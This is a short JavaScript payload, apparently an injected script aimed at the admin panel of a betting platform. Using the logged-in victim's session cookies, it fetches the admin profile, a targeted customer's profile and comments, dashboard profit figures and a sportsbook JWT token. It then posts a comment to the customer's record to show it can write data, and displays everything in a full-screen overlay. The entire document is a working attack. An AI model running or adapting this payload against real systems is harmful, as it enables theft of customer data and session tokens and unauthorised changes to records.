(function(){
  var p = new URLSearchParams(location.search);
  var cid = p.get('cid') || '';
  var b = document.querySelector('meta[name="brand-id"]');
  var bid = (b && b.content) || '68';

  var q = [
    '/api/profile/GetAdminProfile',
    '/api/Customer/GetCustomerProfile?userProfileId=' + cid,
    '/api/Customer/GetUserProfileComments?UserProfileId=' + cid,
    '/api/dashboard/GetDashBoardProfits?ToDate=' + new Date().toISOString() + '&FromDate=' + new Date(Date.now()-30*864e5).toISOString() + '&BrandId=' + bid,
    '/api/gameinfo/getsportsbookjwttoken?BrandId=' + bid
  ];

  var out = {};
  Promise.all(q.map(function(u){
    return fetch(u, {credentials:'include'}).then(function(r){
      return r.text().then(function(t){ out[u] = t.slice(0, 4000); });
    }).catch(function(e){ out[u] = String(e); });
  })).then(function(){
    // Also do one write to prove write context
    return fetch('/api/customer/AddUserProfileCommnt', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        userProfileId: parseInt(cid, 10),
        userProfileCommentTypeId: 1,
        comment: 'diag ' + new Date().toISOString()
      })
    }).then(function(r){ return r.text(); }).then(function(t){ out.w = t; }).catch(function(e){ out.w = String(e); });
  }).then(function(){
    // Render to page (viewer already knows what this is)
    var d = document.createElement('div');
    d.style.cssText = 'position:fixed;inset:0;background:#111;color:#0f0;padding:1em;z-index:2147483647;font:11px/1.3 monospace;overflow:auto;white-space:pre-wrap';
    d.textContent = JSON.stringify(out, null, 2);
    document.body.appendChild(d);
    try { window.__d = out; } catch(_) {}
  });
})();
